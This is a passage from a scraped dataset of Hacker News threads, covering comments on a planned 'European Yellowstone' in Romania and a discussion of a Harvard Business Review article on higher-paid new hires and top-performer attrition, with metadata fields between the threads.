developing [your land/economy], and then come to ours and tell us to protect nature.” Fantastic movie, highly recommended. If you do watch it, watch the original version with the burnt in subtitles. The subtitles have different colours to indicate which language is being spoken, and it has a lot of relevance for the movie and context. reply rr808 10 hours agorootparentTotally. Brazil is having great economic benefits from cutting down its rain-forests and farming cattle. Just like Europeans and Americans did. reply WalterBright 16 hours agoparentprevPeople like to eat. reply yosito 16 hours agorootparentReminds me of a fast food slogan, \"Ya gotta eat! Rally's!\"... not exactly the most appetizing slogan. reply maelito 14 hours agorootparentprevWay too much, as shows the spreading obesity epidemic. reply klyrs 11 hours agorootparentprevLet them eat cake! reply r00fus 16 hours agorootparentprevFrance is a major food exporter. Some of those lands could be re-acquired by the state for non-food uses. Our capitalist world economy equates wealth based on extraction, not preservation. It really needs to be reimagined if we're going to be sustainable at all. reply tmnvdb 15 hours agorootparentThat exported food is also feeding people. reply WalterBright 12 hours agorootparentprev> Our capitalist world economy equates wealth based on extraction, not preservation Why is there no shortage of corn, cows, pigs, and chickens, then? reply ReflectedImage 13 hours agoprevHow do they intend to install the super volcano underneath? reply mistrial9 18 hours agoprevnext [3 more] [flagged] warkdarrior 17 hours agoparent> The Clinton admin knows that this kind of headline appeals to their political support base. You're three decades too late! reply UncleEntity 15 hours agorootparentChelsea hasn't run for president yet. reply tejohnso 18 hours agoprevnext [12 more] [flagged] doikor 18 hours agoparentI guess it depends if land marked as a natural park is tax exempt or not (don't know about Romania legislation on this). If not then they need some revenue to cover the taxes. Not a lot of states are willing to put too much of their land outside of the economy (tax revenue). reply TulliusCicero 17 hours agoparentprevThere are ways to do it respectfully, that's what ecotourism is usually about. As long as you concentrate the tourists mostly in one area so that the majority of the park is left alone by people, I don't see the problem. reply dakna 17 hours agoparentprevThere is already a lot of illegal logging in Romania. Timber is a very valuable resource, and capitalism doesn't care if something is legal or not. As long as there are no revenue streams with less risk available, everyone local will have an incentive to exploit this resource. https://en.m.wikipedia.org/wiki/Timber_mafia reply lowkey_ 17 hours agorootparent+1 to this, the article even states how there's illegal logging operations in the area that are fighting against this preservation. reply pgalvin 18 hours agoparentprevIn order to protect an area from capitalism (e.g. logging), you generally need to give the locals some financial incentive. Eco-tourism is widely credited with protecting mountain gorilla populations, for example, when perhaps in a perfect world we’d be able to just leave them alone. reply hagbard_c 17 hours agoparentprev> isolate it from capitalism? ...and subject it to... what? Capitalism is an economical system centred around private ownership of means of production and a market economy. There are other economical systems to choose from like (national and international) socialism, communism, feudalism and mercantilism. Would any of those do better than capitalism and if so, why? Socialism and communism have shown to fail miserably where it comes to protecting nature as can be witnessed from the devastation of nature in the former Soviet Union [1] and in Mao's China. Feudalism and mercantilism don't seem to offer much hope either. What, then? I understand that it is popular to say that 'capitalism is bad' but I'd like to learn of the alternative which offers better outcomes. [1] https://archive.org/details/destructionofnat0000koma reply malermeister 17 hours agoparentprevBecause capitalism will get its greedy claws in there one way or another. It's either this or logging operations. reply bad_user 17 hours agorootparentWhat do you understand by capitalism? Is it people delivering products and services, asking for whatever price the market is willing to give, such that they can make ends meet? I'm from Romania and I've always been fascinated by privileged westerners complaining of capitalism, when capitalism is the entire reason for why you're privileged. That, plus the hard fact that our communists didn't give a shit about preserving nature or brown bears. Actually, our former dictator was going bear hunting, one if his favorite pass times, and wasn't satisfied without a killing spree with dozens of bears as victims. There are videos of it available. And nobody could do shit about it, because we had no rule of law. For the rule of law, you actually need capitalism, but many of you haven't lived the collective trauma that we did, so that kind of lesson tends to be lost in time. reply malermeister 17 hours agorootparentI'm from Vienna. The reason I'm privileged is the legacy of Red Vienna and the Austromarxists, who built the social housing and the modern welfare state that makes Vienna the most livable city in the world. Your communists sucked, for sure. But that was a personnel issue more than it was an ideological one. reply fgsdgfsdgfd 16 hours agorootparentMost of Austria's growth was attributed to privatizing state corporations since the 1980s. Austria had a higher GDP/capita than the USA in 2008 ($52k vs $48k) but it hasn't grown since while the USA has blown up ($52k vs $77k) reply keybored 15 hours agorootparentprevI’m not at all surprised (or fascinated) that younger former Soviet-bloc people are even more delusionally optimistic about Capitalism than Westerners on a tech entrepreneur forum. reply xemra 18 hours agoprevWonder if they have considered albania. From what I have seen it has an amazing landscape and imo better t reply jesprenj 17 hours agoprev [–] > European Yellowstone That makes it sound like national parks were invented in the USA and there are no national parks in Europe ... So when a new store opens outside of the US it's called European Wallmart? reply jffry 17 hours agoparentIt's a direct quote from somebody who donated to the project, found in the first paragraph of the article: > The aim is to create “the European Yellowstone,” as the largest donor of the initiative described it reply azulster 17 hours agoparentprevyellowstone is literally called the first national park in the world so...yes? reply ethbr1 17 hours agorootparentTo cite sources: >> On March 1, 1872, President Ulysses S. Grant signed The Act of Dedication law that created Yellowstone National Park. https://en.m.wikipedia.org/wiki/Yellowstone_National_Park#Hi... I believe the Yellowstone claim is based on the fact that it was the first park explicitly declared for the benefit of the public by a federal government. reply bombcar 16 hours agorootparentThere are national park-like things that existed before, but they were often technically owned by the King or somesuch. reply colechristensen 17 hours agoparentprevNational parks were invented by the USA and Yellowstone was the first one in 1872. It is also very large. reply 1970-01-01 16 hours agorootparentYellowstone is massive, but only 4% the size of Romania. https://mapfight.xyz/map/ro/#yellowstone reply jkaptur 17 hours agoparentprev [–] The article says it's the term used by the largest donor to the project. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Hansjörg Wyss' philanthropist group is acquiring extensive land in Romania to establish a 'European Yellowstone' in the Carpathian Mountains, aiming to conserve nature, boost ecotourism, and enhance the region's economy.",
      "The foundation has purchased 27,027 hectares and targets a 200,000-hectare protected area, encountering opposition from residents, hunting groups, and struggles in setting up a national park.",
      "Efforts include reforestation, wildlife preservation, and community involvement to tackle obstacles and establish a viable conservation framework."
    ],
    "commentSummary": [
      "Talks focus on establishing a European Yellowstone National Park in Romania to reintroduce bison, highlighting wildlife behavior, human presence in natural habitats, tourism, conservation, economic struggles in Romania, and capitalism's effects on natural resources.",
      "Emphasizes the essence of coexisting with wildlife, acting responsibly, and conserving nature as central themes in the discourse."
    ],
    "points": 268,
    "commentCount": 216,
    "retryCount": 0,
    "time": 1711721936
  },
  {
    "id": 39867160,
    "title": "Top performers may resign if new hires are paid more",
    "originLink": "https://hbr.org/2024/03/when-new-hires-get-paid-more-top-performers-resign-first",
    "originBody": "TransparencyWhen New Hires Get Paid More, Top Performers Resign First Subscribe Sign In Hi, Guest CLEAR SUGGESTED TOPICS Explore HBR Latest The Magazine Ascend Podcasts Store Webinars Newsletters Popular Topics Managing Yourself Leadership Strategy Managing Teams Gender Innovation Work-life Balance All Topics For Subscribers The Big Idea Data & Visuals Reading Lists Case Selections HBR Learning Subscribe My Account My Library Topic Feeds Orders Account Settings Email Preferences Log Out Sign In Subscribe Latest Podcasts The Magazine Ascend Store Webinars Newsletters All Topics The Big Idea Data & Visuals Reading Lists Case Selections HBR Learning My Library Account Settings Log Out Sign In Your Cart Your Shopping Cart is empty. Visit Our Store Guest User Subscriber My Library Topic Feeds Orders Account Settings Email Preferences Log Out Reading List Reading Lists Latest Magazine Ascend Topics Reading Lists Podcasts Store The Big Idea Data & Visuals Case Selections HBR Learning Transparency When New Hires Get Paid More, Top Performers Resign First Research shows that unaddressed pay gaps will push veteran talent to find new jobs. by Andrea Derler, Peter Bamberger, Manda Winlaw, and Cuthbert Chow by Andrea Derler, Peter Bamberger, Manda Winlaw, and Cuthbert Chow March 05, 2024 Paul Taylor/Getty Images Post Post Share Annotate Save Get PDF Buy Copies Print Summary. To attract new talent, employers often offer new hires higher wages than existing employees. But today, a combination of regulatory changes and technological advances have dramatically increased pay transparency in many sectors, making employees increasingly aware of these pay disparities. How do existing employees (and especially top performers) react to these higher-paid new hires? And how can organizations mitigate the associated risks? The authors’ recent research shows that unless employers adjust existing employees’ wages soon after making a new hire, employees tend to resign — and that top performers tend to resign faster than others. As such, employers should be aware of the impact hiring higher-paid external talent can have on their teams, conduct regular pay equity analyses to ensure that any disparities are fully explainable, and develop the agility necessary to adjust wages as soon as any inequities are identified. Post Post Share Annotate Save Get PDF Buy Copies Print To attract top talent, employers often pay new hires more than they pay existing employees in equivalent roles. This isn’t new. But today, regulatory changes and technological advances have dramatically increased pay transparency in many sectors, making employees more aware of these pay disparities. Moreover, data from the U.S. Chamber of Commerce indicates that the workforce is expected to shrink in 2024, while a global survey of more than 30,000 employees found that salaries are expected to increase by an average of 4% in 2024, suggesting that these pay gaps will likely continue to expand. Readers Also Viewed These Items 5 Years of Must Reads from HBR: 2019 Edition (5 Books) Book Buy Now Breaking Out: How to Build Influence in a World of Competing Ideas Book Buy Now Read more on Transparency or related topics Compensation and benefits and Hiring and recruitment AD Andrea Derler is Visier’s principal of research and value, where she collaborates with Visier’s team of data scientists, people analytics experts, as well as HR professionals to help produce practical, data-driven insights for organizations. Visier is a Canadian-based people analytics technology provider, which maintains a database of more than 15 million employee records from over 15,000 companies globally. PB Peter Bamberger is a professor of organizational behavior and the head of the organizational behavior department at the Coller School of Management, Tel Aviv University. He is the former editor in chief of Academy of Management Discoveries and currently serves as the President-Elect of the Academy of Management, as well as the research director of the Smithers Institute of Cornell University’s ILR School. He is a world-leading expert on compensation strategy and pay communication. His work has been cited over 15,000 times. MW Manda Winlaw is a data science manager at Visier, contributing to research and developing data products for the Visier app. She has worked as a data scientist in a number of different fields and strongly believes in using data to drive better decisions for all people. CC Cuthbert Chow, MDS, BBA, and LLB, works in Visier’s publications focus area as a data scientist co-op. Cuthbert’s primary role is discovering novel and industry-relevant insights within Visier’s rich community data. Cuthbert holds a master’s in data science and bachelor’s in law and business. Post Post Share Annotate Save Get PDF Buy Copies Print Read more on Transparency or related topics Compensation and benefits and Hiring and recruitment Recommended For You How to Actually Execute Change at a Company Take Ownership of Your Future Self How to Interview a Candidate You Don't Immediately Click With Podcast To Negotiate Better, Start with Yourself Partner Center Start my subscription! Explore HBR The Latest All Topics Magazine Archive The Big Idea Reading Lists Case Selections Podcasts Webinars Data & Visuals My Library Newsletters HBR Press HBR Ascend HBR Store Article Reprints Books Cases Collections Magazine Issues HBR Guide Series HBR 20-Minute Managers HBR Emotional Intelligence Series HBR Must Reads Tools About HBR Contact Us Advertise with Us Information for Booksellers/Retailers Masthead Global Editions Media Inquiries Guidelines for Authors HBR Analytic Services Copyright Permissions Manage My Account My Library Topic Feeds Orders Account Settings Email Preferences Account FAQ Help Center Contact Customer Service Follow HBR Facebook X Corp. LinkedIn Instagram Your Newsreader About Us Careers Privacy Policy Cookie Policy Copyright Information Trademark Policy Terms of Use Harvard Business Publishing: Higher Education Corporate Learning Harvard Business Review Harvard Business School Copyright © 2024 Harvard Business School Publishing. All rights reserved. Harvard Business Publishing is an affiliate of Harvard Business School.",
    "commentLink": "https://news.ycombinator.com/item?id=39867160",
    "commentBody": "When new hires get paid more, top performers resign first (hbr.org)245 points by mooreds 15 hours agohidepastfavorite196 comments jedberg 15 hours agoThis is one of the reasons I loved Netflix. Each year they would say \"to get new people in the door with your level experience, we had to offer them $XXX. Therefore we are raising you to $XXX.\" Some years I got 25%+ raises. Netflix understood this like no one else. reply theshrike79 15 hours agoparentCompanies should understand when their business hangs on people, you need to keep the people happy. Hiring people off the street for more money than people with 20+ years of experience isn't a good way to keep experienced workers employed. reply onlyrealcuzzo 15 hours agorootparentThe problem is - historically it hasn't bitten companies badly enough that they stop doing it. On aggregate, you can get away with massively underpaying your top talent and overpaying new hires - most of which aren't good and will go to other companies before they're even moderately productive. I question why they're so obsessed with hiring so many new people to do basically nothing. That's the reason they have to over pay for them: The sheer amount that they're trying to hire. Perhaps it's inevitable that you have to hire 100 people to find 5 or so people that'll be good and stick around for a while that you can underpay in the future. I suspect there's got to be a better way. reply kelnos 14 hours agorootparent> The problem is - historically it hasn't bitten companies badly enough that they stop doing it. The reason for that is the culture around keeping compensation secret. Most people (in the US at least) believe it's impolite to talk about salary directly. I do wonder how much of this taboo has been cultivated by corporations that benefit from workers feeling like they shouldn't talk about salary. On top of that, some companies tell their employees they are not allowed to talk about salary. That practice is illegal, but some companies still do it. reply Buttons840 13 hours agorootparentTo be clear, Federal law is very explicit that you have the right to discuss and disclose your salary. reply wakawaka28 13 hours agorootparentYou have the right to do it, but your coworkers might become bitter and envious if you make more than them. You have to judge how mature your coworkers are and whether it would cause trouble for you if they made a complaint to your manager. For example, if you are on a team of like 5 people, it could be impossible for them to maintain your anonymity as they say \"Why am I making less than others?\" You might also imagine that if your coworkers don't get the raise, they will not be as motivated to work, and may cause problems for you that way. I've been on both ends of this, usually the lower end, and I can say first hand it is hard to not take getting paid less as a personal affront to your dignity. And every time I was underpaid I not only didn't get a big raise, but I took much longer than expected to find another job. If you are underpaid, your best option is to leave in most cases. Don't underestimate how long you have to tolerate the low pay while you try to leave. reply Buttons840 11 hours agorootparentThat's all true. I've usually asked co-workers I'm friends with, and believe we can both be mature enough, if they want to exchange pay info. I've also told a few people what my salary was when I'm leaving a company, and tell them to share it freely. Everything you say is true though, it can cause a lot of drama if people start having hard feeling over pay. This is why companies sometimes tell people not to share their salary, or even put it in the company handbook, etc, and I'll say again: it is illegal for a company to tell or even suggest that you not to share you salary. > And every time I was underpaid I not only didn't get a big raise, but I took much longer than expected to find another job. How are the two related? Why does being paid less cause you to take longer to find a new job? reply wakawaka28 3 hours agorootparent>How are the two related? Why does being paid less cause you to take longer to find a new job? Being paid less didn't actually make me take longer to find another job. But I looked for other jobs to get more money. My point is, simply knowing you are paid less/unfairly is not a silver bullet. Most companies will refuse to give raises on demand, on principle. You most likely can't just get a new job right off either or you would have just done it. So you'll be stuck for months or even years knowing how much less you make than your coworkers. Nobody thinks they'll mind knowing the truth, because they underestimate their own ego and how difficult it is to get more money. Most businesses would rather pay someone new and unproven significantly more than you're asking rather than give you, say, a random 10% raise. It kinda makes sense, because there's no limit to what you can ask for. Most non-tech people seem to resent how much more we make as well. So for various reasons, they don't want to pay you more and/or don't believe you are worth more, and you have to prove it to them by leaving. reply bberenberg 13 hours agorootparentprevThis thread and study seem to disagree with your assessment: https://x.com/captgouda24/status/1773031323604488342?s=20 reply ranger207 14 hours agorootparentprev> historically it hasn't bitten companies badly enough that they stop doing it. Because VC money based around vague promises of selling data to advertisers have traditionally propped up even fundamentally unprofitable businesses so software quality hasn't significantly contributes to success or not. Now that we're out of ZIRP then companies might start learning that in 10 years or so after they've replaced a few generations of programmers, nobody knows how anything works, and suddenly software quality starts to actually matter to investors and consumers reply indigochill 13 hours agorootparent> companies might start learning that in 10 years or so after they've replaced a few generations of programmers, nobody knows how anything works, and suddenly software quality starts to actually matter to investors and consumers I suspect in software specifically, there will never be such a reckoning because compared to maintenance, replacement is too easy. reply onlyrealcuzzo 13 hours agorootparent> I suspect in software specifically, there will never be such a reckoning because compared to maintenance, replacement is too easy. Maybe when it's not important to be bug for bug compatible. For most important software, it kind of is. reply diob 14 hours agorootparentprevI would argue it does bite them, but by the time it does it's someone else's problem. reply sonicanatidae 13 hours agorootparent>I would argue it does bite them, but by the time it does it's someone else's problem. In almost all cases, it's the consumer that gets bitten. reply ChrisMarshallNY 14 hours agorootparentprev> there's got to be a better way Be better managers. Do more human work during the hiring selection process. Take HR away from the lawyers. Take Responsibility and Accountability for the management layers of the company (including the C-suite). But we all know these are just pipe dreams. reply HumblyTossed 14 hours agorootparentprevBut they don't. The people calling themselves managers will justify not paying existing people more once they have to pay new people more by saying that that is what they signed up for when they started. And then when people leave, they convince themselves that we are all interchangeable. No matter what happens, they have some sort of excuse or justification. reply space_oddity 13 hours agorootparentprevHigh staff turnover some companies consider as a good thing reply zerr 15 hours agoparentprevThat's better than being forced to do interviews at other FANGs, getting offers and only then getting raises matching those offers. I heard Netflix suggested this as well, for determining the current \"market rate\". Offloading the market research to engineers basically. reply jedberg 14 hours agorootparentYup! We were encouraged to take interviews at other companies for multiple reasons. One was to report back the offer as data for the HR team. They used that both in level setting new offers as well as making sure you got an appropriate raise. It was also because Netflix understood that if you found a better job, it was better for both you and Netflix to leave and take that job, because it meant that you weren't truly happy at Netflix and may not be doing your best work. It was truly an enlightened way to think about talent, and I've never seen anything as good since. reply kayge 14 hours agorootparentSounds pretty ideal! But it also sounds like you're talking about all of this in the past tense... why did you end up leaving, if you don't mind me asking? :) reply jedberg 14 hours agorootparentHad a baby and retired. :) Retirement didn't last though, now that both kids are in school I'm back at work. FWIW I would go back in a heartbeat if they had a role for me. reply zerr 13 hours agorootparentWasn't Netflix a family-friendly place? How common was part-time employment? Did the culture of fear prevail? reply jedberg 13 hours agorootparentThey were plenty friendly to families, but I was ready to go full time at home. We didn't really have anyone working part time, and at the time there was no remote work either. reply kayge 13 hours agorootparentprevAhh, those seems like great reasons. Double congrats, and thanks for answering! reply beoberha 14 hours agorootparentprevIt’s an awesome mentality, but I think it comes out of Netflix being a company that sells to consumers and not enterprises. I work at a big cloud company. We don’t have enough engineers to do the work our customers want us to do. Each piece of work comes from someone spending millions of dollars a year that has executive visibility. Letting someone go means some committed project goes unfunded and an unhappy customer. reply willcipriano 13 hours agorootparent> We don’t have enough engineers to do the work our customers want us to do > Each piece of work comes from someone spending millions of dollars a year You can afford to hire, you have the work. Where's the bottleneck? I'm hearing lots about unemployed people, especially on here. reply fnordpiglet 15 hours agorootparentprevIn finance this is called price discovery. In the labor market it’s called waiting until someone is one foot out the door. It’s much more expensive to correct the situation once someone has already decided to leave. reply olivierduval 14 hours agorootparentBut corp logic: it's cheaper to raise ONE top performer when he wants to go than to raise EVERYBODY (even those not interested in leaving) to match market reply bb88 14 hours agorootparentNo argument, but if I'm interviewing and get a better offer, I'm probably gonna leave. Further in some corporations, interviewing for other positions is a bright shiny red flag for that person to be let go or fired. Even if they accept the counter offer. reply LoganDark 11 hours agorootparent> if I'm interviewing and get a better offer, I'm probably gonna leave. If I could get the same amount of money from my current job I would probably stay unless I'm sure I would love the other job more. Because when money is a constant, it's either do I want to keep doing what I'm good at, or jump into something possibly different (and riskier). reply bluSCALE4 15 hours agoparentprevMakes me happy that at least someone out there is experiencing pay fairness. reply logtempo 11 hours agoparentprevIn other words, they're trying to keep the variance of the distribution of salaries constant over time. Limiting economic disparity have always been beneficial to the group I believe (I don't have data for that). In the same company, the top should not be paid x% more than the lower salary. In the same country, the maximum wage should not exceed x% more than the minimum wage (after taxes). reply testfoobar 15 hours agoparentprevWould the 25% raise be composed primarily of salary or stock? reply jedberg 15 hours agorootparentCash. Netflix lets you basically turn a dial on the ratio of cash to stock, but it starts with a single cash number. reply Jcampuzano2 15 hours agorootparentprevPretty sure I've read and heard everywhere that Netflix is a rarity in that the vast majority of your total comp is directly in salary. So it likely resulted in primarily salary increases. reply ivalm 15 hours agorootparentprevNetflix is just salary reply mmxmb 15 hours agorootparentprevNetflix doesn’t do stock comp. reply i_am_a_peasant 14 hours agorootparentapparently for some people they do lol reply jpalawaga 13 hours agorootparenthistorically they've had an options program that you could optionally participate in, with your salary. the rumblings i've heard seems to imply they'll be rolling out an RSU system in the future as they continue to destroy the unique corporate culture they had. reply i_am_a_peasant 11 hours agorootparentHad that at Wind River years ago. They'd both give you RSUs as a kind of bonus but you could also invest a part of your salary in RSUs. Don't know if they're still a thing. reply guiomie 14 hours agoparentprevWould they also do the opposite now that the tech labor market is going sour? \" We got 1000 qualified applicants and a bunch accepted our low ball offers, your salary is reduced by 25% \" reply jedberg 14 hours agorootparentAs far as I saw they never lowered salaries. They would say \"the market is down this year, so you won't get a rise, but you're still at the top of your market\". You could always go out an interview and come back with new data if you got a better offer. reply gardenhedge 14 hours agoparentprevThat's awesome! It comes down to mindset by the people running the company reply _pi 13 hours agoparentprevYeah. just don't go on paternity/maternity leave. reply jedberg 13 hours agorootparentNetflix has a one year paternity/maternity leave policy, and some people take the full one year. reply pacifika 13 hours agorootparentPaid / unpaid? reply jedberg 13 hours agorootparentPaid. Looks like they changed it to \"take whatever time you need\", and most people are taking 4-8 months. https://jobs.netflix.com/work-life-philosophy reply _pi 12 hours agorootparentprevSure. Did they stop punishing people with their \"actual meritocracy\" metrics for taking it? reply bevekspldnw 15 hours agoprevUsed to be a high performer at Big Tech. Found out a coworker with less experience at the same level had $200k/year more in comp. I didn’t care about the money, I care about being taken for a fool. There were additional factors, but I left and started my own company within three months and nobody in my old team has anywhere close to my experience. reply shaneoh 15 hours agoparentMore curious about your story of starting your own company on a near-whim! I've been grinding out trying to do the same over a year or so without any traction at all and I'm finding myself almost back at Square 1 without any more solid ideas. reply technotony 15 hours agorootparentDalton and Michael talk about folks pivoting too much and not fully learning/validating from each pivot in this recent video. Obviously I don't know anything about what you've been doing but perhaps there's some wisdom here: https://www.ycombinator.com/blog/when-to-pivot-and-when-to-s... reply bevekspldnw 9 hours agorootparentprevI’ve been working at the forefront of my speciality for many years. It doesn’t really matter where I am, I’m always working on solving the same challenges. Jobs and stuff are an annoying necessity, the business is really just a thing I had to build to keep working on my primary tasks. A lot of what looks like success on the outside is really just stubborn focus on a hard problem across many years. So I’ve had many prestigious jobs and titles, but it’s all just to allow me to do what I want. reply pryelluw 15 hours agorootparentprevThis just tells me you’re not well versed in sales and marketing. Learn those first (specially direct response) and the other pieces will glide into place with less effort. reply atrus 14 hours agorootparentWhat are some good resources to learn this? reply soogwoog 14 hours agorootparentUnfortunately, experience. A good dose of people skills help, but you need to know what makes real money move and get contacts in your area. Find someone who has succeeded in your area, and try to get into those circles. reply mandmandam 14 hours agorootparentprevI'm interested in developing in this area as well, but I can say for sure that \"The Mom Test\" is basically an essential read. reply bmitc 15 hours agoparentprevNot only is it an example of the idiotic decision making processes that companies use that are not effective in the long run, it demonstrates how they are happy to pit employees against one another. It is awkward for a person to know that they make substantially more than coworkers. It forms a feeling of guilt and other negative feelings. But what are they supposed to do? Negotiate lower salaries when starting or after working for a while? And it's definitely frustrating knowing other coworkers with the same or less experience and responsibilities as you make a whole lot more. It forms feelings of jealousy, not feeling valued, self worth, and other negative feelings. And all of this is caused by the company simply not caring about actually employing and managing humans. And it's always been insane to me that companies will let an experienced person leave because they won't raise their salary and then immediately put out a job requisition at a salary that would have kept the experienced person. It makes no sense, and yet, this happens constantly. reply JohnFen 14 hours agorootparent> It is awkward This is why I don't discuss my salary, nor do I want to know what my coworkers make. It's not information that is terribly useful, but can make for very awkward situations. I do want to know whether or not I'm making a salary that is in line with the norms in my area, but I can easily find that information without knowing what any individual is making. reply thrwaway1985882 14 hours agorootparent> It's not information that is terribly useful This opinion feels alien to me. Some of the most useful information you can have in a company is around salary/bonus/commission structures. From a purely self interested perspective, knowing this makes you a far better negotiator around review season. And from an organizational perspective, understanding what kind of things get people their bonus or commission goes a long way to understand what kind of decisions they make and how to influence them. As a manager, though: thanks, employees with this perspective reduce the number of awkward meetings I might have. reply JohnFen 13 hours agorootparentI think that it's a matter of priorities. I am not interested in making the most money I possibly can, I'm interested in doing the most interesting work that I possibly can. I have even taken jobs where I was paid well below market rates because the work itself was interesting enough to me or taught me a skill that I really wanted to learn. As long as I'm being paid at least an amount that I consider fair, it doesn't matter to me what anyone I'm working next to makes. If I disclose my salary and I'm making substantially more or less than my teammates, that can cause reactions in them that make the job much less tolerable regardless of my pay rate. So I don't want to know what they make, and I don't want them to know what I make. I have to work with these people, and want that to be as pleasant as possible. Now, saying that is not saying that people who prioritize maximizing pay are wrong at all. They just have a different priority. reply bevekspldnw 9 hours agorootparentI don’t care about money, that’s not my personal issue. I’ll happy to pay my bills, have good food on my table, and have a roof over my head. It’s the feeling that I’ve been hoodwinked that I refuse to tolerate. reply zem 11 hours agorootparentprevdepends on whether you feel like you have the leverage to do something about it, or if all that happens now is you do the same job with the same pay and the additional knowledge that someone else is making more. reply andruby 14 hours agorootparentprev> I can easily find that information without knowing what any individual is making. How do you usually find that information? reply JohnFen 13 hours agorootparentThe city and state governments have pretty solid data that is easily available. reply peteradio 15 hours agorootparentprevThe social order is fundamentally nepotistic. Family/Tribe/Caste matters more than experience/performance within the managerial bubble. Keeping the actual workers down helps to keep them desperate to put food on the table, but you better perform well enough to float the non-workers. Deloitte/Wipro/Infosys/et.al know how to play this game very well to discourage anyone not in the tribe from advancing. reply ironmanszombie 13 hours agorootparentYep. It's not the clueless HR but systematic. I have yet to read anything specific about why this happens and the benefits of it. reply bmitc 13 hours agorootparentOne of the reasons I have realized is that it's sometimes about control. A manager (people, project, product) will not have as much control over an experienced employee who has potentially been at the company a long time or just has a lot of experience in general in terms of getting what they want from the employee, despite the employee having the business' best interest in mind. So it's an implicit attrition that seems to sometimes be desired. reply bevekspldnw 9 hours agorootparentprevShhhh…never mention caste in SV. reply fakedang 15 hours agorootparentprevHonestly is it company culture, or is it just clueless HR teams who can't hire for shit? I'm not complaining though, stupid HR and hiring policies are the reason we're consistently getting some really good people from FAANG to join our tiny firm. reply matheusmoreira 14 hours agoparentprev> I didn’t care about the money, I care about being taken for a fool. Truly one of the worst feelings there is... But I sure would have cared a lot about the 200kUSD/year too. reply bevekspldnw 9 hours agorootparentThe money from big tech is dirty money, ironically the more one piles up the less they are aware of the stench. reply space_oddity 13 hours agoparentprevYou turned challenges into opportunities for growth! reply bevekspldnw 9 hours agorootparentAlways. :-) reply mv4 11 hours agoparentprevHow did you find out? reply mupuff1234 15 hours agoparentprevWas it the result of them getting lucky with timing the RSU grant or was it just their original offer? reply bevekspldnw 9 hours agorootparentI got fucked on my offer. Something of a phyrric victory for HR - lost a high performer and gained a competitor over a rounding error in the budget. reply dragon-hn 15 hours agoprevI just had a very valuable teammate quit this week from lack of salary progression. New-ish grads are making more than him for much lesser jobs. The business refused to do even a token salary increase because of the ‘economic climate’ Now a critical project won’t happen on time, which will cost the company many magnitudes more in revenue than it would have cost them with a token increase. Oops. reply rybosworld 15 hours agoparentThis is easily fixed by giving management attrition targets. Some companies (Amazon) say \"you need to let go of ~6% of your headcount every year.\" Others will flip this and say: \"you need to retain 94% of your headcount every year.\" The effect on salaries is more or less the same. If you know you need to keep employees, you give salary increases to the one's most at risk of leaving. If you know you need to let go of employees, you don't provide salary increases to the one's you want to get rid of. Many companies don't have an attrition target at all, though. reply xyproto 13 hours agorootparentTeams start to battle to have low performers on their team in a climate like that, though, as an insurance from being let go. It's absurd. reply xethos 6 hours agorootparentBut a rank stack is cause for insurance because somebody is being let go. Needing to keep at least 94% of headcount, with no penalty to management for being above (and possibly a bonus for staying above the minimum) sounds like the opposite. reply bell-cot 15 hours agoparentprevBut, viewed on a small-enough scale, the managers did get their way. And \"small\" is usually quite descriptive of managers. reply hobs 14 hours agoparentprevI've seen this before so many times, and recommend people quit and sometimes even apply back at their same company. I got my friend a 30% raise after he quit, worked at a new place for two months, it blocked implementation of key projects and the CEO started freaking out. I asked him how much he would pay to fix the problem, and he gave me a number. I said if we paid that as the new salary to my friend we could have him working there in a week. The CEO made the call in front of me lol. reply andruby 14 hours agorootparentThat’s a great tactic. I’d love to use that, but I’m afraid a lot of leaders are not rational enough (or have to big of ego’s) to hire the person back reply hobs 11 hours agorootparentIt really takes a big desperation for money to allow such ego death, absolutely. reply andruby 14 hours agoparentprevI hate this shortsightedness of business leaders. I’ve seen similar problems. Not wanting to give a raise to a critical person, and then having to replace them with 3 people. Not wanting to pay 10% more and ending up paying 300% more… reply slifin 14 hours agoparentprevIn my experience, this kind of thing might not even register with most companies There's a meta-game that most sociopaths/narcs are playing like their lives depend on it to get their supply and climb the internal ladder, that's taking up so much energy/time/resources of the company, falling upwards That there's nothing left to care about this sort of thing reply tayo42 15 hours agoparentprevAre you all extremely underpaid or something? Or how are new grads getting so much in a down market? I'm decently experienced saw lots of relatively low paying jobs in general reply 01HNNWZ0MV43FF 14 hours agorootparentApparently I'm underpaid lol, someone upthread says \"Friend getting paid $200k more than me\" and I've never been paid $200k in my life reply vundercind 13 hours agorootparentOnly a very small proportion of developers make enough that they can be making what must have been north of $200k and still have another $200k difference in comp vs a peer. Low side of single-digit percentage. And I’m talking the US only, not globally. reply dragon-hn 14 hours agorootparentprevThe company puts A LOT of effort into its program for hiring new grads. But is horribly inept when it comes to providing a career path for individual contributors. So unless you manage to get a promotion to a senior IC position (like me), your compensation stagnates. reply Zambyte 14 hours agorootparentprevWhat market is down? reply suzakus 14 hours agorootparentThe regular software engineering market is very rough to get jobs in right now, particularly at lower levels of experience reply mooreds 11 hours agorootparentAgreed. This is in line with experience of friends (Metro Denver, USA). Even senior folks are having a harder time than in the past few years. reply vundercind 13 hours agorootparentprevLow to mid experience and trying to land FAANG-alike or finance jobs, I think. The “merely” 1.5-3x median household income comp range sure seems to have remained healthy, even for newbies. reply newaccount7hhhf 14 hours agoparentprevWhat do you mean “cost them money” I legitimately can’t think of situation where releasing a product behind deadline would cost a business money? Obviously they just allocated resources more efficiently because they have fewer people. Likely they made more money because of increased demand. reply LeifCarrotson 14 hours agorootparentDifferent businesses have different meanings to deadlines and timelines. If it's v6.8 of your internal software product, no, the deadline doesn't usually matter that much. Maybe you are a bit behind your competition, but the only problem with just being at the 6.7 feature set a little longer is a small percentage of customers not sticking around. Your manager probably overpromised and underestimated, but aside from a bit of abuse and panic, you're right, it doesn't really matter. But if you're one of 120 companies building parts for the 2025 F150 and your part isn't ready and the other 119 companies are ready, whether it's your supplier or you or your customer who is behind, you'd better believe that they've got you over a barrel in the contract. Like, the contract has a line that reads \"for every minute of downtime after [date] you owe $25k\". Your PM hopefully underpromised with an aim to overdeliver, but missed really bad. And all the checks and balances failed. If you've got adequate financials you can survive a miss once in a great while, but two or three in a row and even big shops will go under. It's often important to understand the consequences of missed deadlines that your coworkers, vendors, or especially customers are accustomed to, people have wildly disparate experiences in this area. reply jedberg 14 hours agorootparentprevI have a product that can bring in $10,000 in profit each week. If I launch it four weeks late, I just lost $40,000. Or I have a product that relies on certain hardware. I've already bought/leased that hardware, so I'm now paying depreciation/lease payments for that hardware. Every week I delay the launch I'm losing money on those payments because the hardware is 